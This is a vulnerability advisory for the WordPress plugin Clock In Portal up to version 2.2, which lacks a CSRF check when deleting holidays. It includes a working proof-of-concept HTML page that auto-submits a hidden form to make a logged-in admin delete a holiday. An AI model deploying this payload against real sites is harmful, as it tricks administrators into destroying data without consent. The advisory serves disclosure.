## WordPress Plugin Vulnerabilities

# Clock In Portal <= 2.2 - Holidays Deletion via CSRF

### Description

The plugin does not have CSRF check when deleting Holidays, which could allow attackers to make logged in admins delete arbitrary holidays via a CSRF attack

### Proof of Concept

Make a logged in admin open a page with the code below, this will make them delete the Holiday with ID 1
<html>
<body onload="document.forms[0].submit()">
<form action="https://example.com/wp-admin/admin.php?page=cip-holidays" method="POST">
<input type="hidden" name="action" value="delete" />
<input type="hidden" name="id" value="1" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
